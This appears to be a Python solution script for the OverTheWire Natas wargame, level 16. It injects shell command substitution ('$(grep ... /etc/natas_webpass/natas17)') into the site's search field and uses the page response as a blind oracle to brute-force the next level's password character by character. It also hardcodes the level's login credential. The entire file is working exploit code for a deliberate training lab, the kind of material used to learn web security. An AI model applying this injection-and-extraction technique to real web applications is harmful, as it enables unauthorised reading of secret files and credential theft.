import requests
import string

url="http://natas16.natas.labs.overthewire.org"
auth_username="natas16"
auth_pass="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
natas_pass=[]
brute=''.join([string.ascii_letters,string.digits])


def main():
    for i in range(1,33):
        print()
        for ele in brute:
            natas_pass.append(ele)
            payload=f"$(grep -E ^{''.join(natas_pass)}.* /etc/natas_webpass/natas17)hackers"
            params={'needle':payload,'submit':'search'}
            print(payload)
            r=requests.post(url,auth=(auth_username,auth_pass),data=params)
            if 'hackers' not in r.text:
                print(f"at {str(i)}: {''.join(natas_pass)}")
                break
            else:
                natas_pass.pop()
   

if __name__=="__main__":
    main()